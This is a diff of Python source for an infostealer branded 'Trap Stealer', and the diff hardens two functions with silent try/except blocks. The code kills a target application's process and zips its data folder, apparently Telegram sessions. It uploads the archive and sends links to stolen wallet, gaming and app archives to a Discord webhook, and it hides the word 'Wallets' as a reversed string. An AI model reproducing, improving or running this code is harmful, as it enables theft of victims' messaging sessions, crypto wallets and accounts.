@@ -1621,27 +1621,30 @@ def uploadwa():
         pass
     
 def ZipTelegram(path, arg, procc):
-    global OtherZip
-    pathC = path
-    name = arg
-    if not os.path.exists(pathC):
-        return
+    try:
+        global OtherZip
+        pathC = path
+        name = arg
+        if not os.path.exists(pathC):
+            return
 
-    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+        subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
 
-    with ZipFile(f"{pathC}/{name}.zip", "w") as zf:
-        files = [file for file in os.listdir(pathC) if not (
-            ".zip" in file
-            or "tdummy" in file
-            or "user_data" in file
-            or "webview" in file
-        )]
-        for file in files:
-            zf.write(f"{pathC}/{file}")
+        with ZipFile(f"{pathC}/{name}.zip", "w") as zf:
+            files = [file for file in os.listdir(pathC) if not (
+                ".zip" in file
+                or "tdummy" in file
+                or "user_data" in file
+                or "webview" in file
+            )]
+            for file in files:
+                zf.write(f"{pathC}/{file}")
 
-    lnik = upload_file(f'{pathC}/{name}.zip')
-    os.remove(f"{pathC}/{name}.zip")
-    OtherZip.append([arg, lnik])
+        lnik = upload_file(f'{pathC}/{name}.zip')
+        os.remove(f"{pathC}/{name}.zip")
+        OtherZip.append([arg, lnik])
+    except:
+        pass
 
 
 def ZipThings(path, arg, procc):
@@ -2079,44 +2082,46 @@ def GatherZips(paths1, paths2, paths3):
     for thread in thttht: 
         thread.join()
     global wltZip, GamingZip, OtherZip
-    wals, game, otth = "",'',''
-    azz = 'stellaW'
-    if len(wltZip) != 0:
-        
-        wals = f":coin:  •  {azz[::-1]}\n"
-        for i in wltZip:
-            wals += f"└─ [{i[0]}]({i[1]})\n"
-    if len(GamingZip) != 0:
-        game = ":video_game:  •  Gaming:\n"
-        for i in GamingZip:
-            game += f"└─ [{i[0]}]({i[1]})\n"
-    if len(OtherZip) != 0:
-        otth = ":tickets:  •  Apps\n"
-        for i in OtherZip:
-            otth += f"└─ [{i[0]}]({i[1]})\n"
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
+    wals, game, otth = '','',''
+    try:
+        azz = 'stellaW'
+        if len(wltZip) != 0:
+            
+            wals = f":coin:  •  {azz[::-1]}\n"
+            for i in wltZip:
+                wals += f"└─ [{i[0]}]({i[1]})\n"
+        if len(GamingZip) != 0:
+            game = ":video_game:  •  Gaming:\n"
+            for i in GamingZip:
+                game += f"└─ [{i[0]}]({i[1]})\n"
+        if len(OtherZip) != 0:
+            otth = ":tickets:  •  Apps\n"
+            for i in OtherZip:
+                otth += f"└─ [{i[0]}]({i[1]})\n"
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
 
-    data = {
-        "embeds": [
-            {
-            "title": "Trap Stealer Zips",
-            "description": f"{wals}\n{game}\n{otth}",
-            "color": 0xffb6c1,
-            "footer": {
-                "text": "Trap Stealer ZIP",
-                "icon_url": "https://images-ext-2.discordapp.net/external/t2jmsVmF2FvFLwOKUYc8jVDiBS32FDKP7pdFuepWwMU/https/cdn3.emoji.gg/emojis/3304_astolfobean.png"}
-            }
-        ],
-        "username": "Trap Stealer",
-        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-        "attachments": []
-    }
-    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+        data = {
+            "embeds": [
+                {
+                "title": "Trap Stealer Zips",
+                "description": f"{wals}\n{game}\n{otth}",
+                "color": 0xffb6c1,
+                "footer": {
+                    "text": "Trap Stealer ZIP",
+                    "icon_url": "https://images-ext-2.discordapp.net/external/t2jmsVmF2FvFLwOKUYc8jVDiBS32FDKP7pdFuepWwMU/https/cdn3.emoji.gg/emojis/3304_astolfobean.png"}
+                }
+            ],
+            "username": "Trap Stealer",
+            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+            "attachments": []
+        }
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+    except:
+        pass
 
-import os
 
 def dlself(script_path):
     try:
